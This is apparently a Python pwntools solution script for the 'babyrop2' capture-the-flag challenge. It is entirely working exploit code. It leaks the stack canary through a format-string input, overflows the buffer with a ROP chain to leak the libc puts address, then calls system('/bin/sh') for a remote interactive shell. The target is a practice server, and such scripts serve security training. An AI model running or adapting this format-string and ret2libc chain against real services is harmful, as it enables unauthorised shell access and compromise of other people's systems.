from pwn import *
from LibcSearcher import *
context.arch='amd64'

# there is a function which could leak canary by strfmt,
# debug to find the offset is 11,
# so just leak the canary and get shell by overflow

# p = process('../Desktop/babyrop2')
p = remote('node3.buuoj.cn',29177)
elf = ELF('../Desktop/babyrop2',checksec=False)

pop_rdi = 0x0000000000400993 # pop rdi ; ret
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

p.recvuntil("I'll give u some gift to help u!\n")
p.sendline('%11$p') 	# leak the canary
canary = int(p.recvuntil('\n',drop=True),16)
log.success('canary = %#x',canary)

payload = 'A'*(0x20-0x8) + p64(canary)
payload = payload.ljust(0x20+0x8,'B')
payload += flat([pop_rdi, puts_got, puts_plt, main])
p.recvuntil('story!\n')
p.send(payload)
puts_addr = u64(p.recvuntil('\nCan',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

p.recvuntil("I'll give u some gift to help u!\n")
p.sendline('nop')

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info("system_addr = %#x, binsh = %#x"%(system_addr,binsh))

payload = 'A'*(0x20-0x8) + p64(canary)
payload = payload.ljust(0x20+0x8,'B')
payload += flat([pop_rdi, binsh, system_addr])
# p.recvuntil('story!\n')
p.send(payload)
sleep(1)
p.interactive()
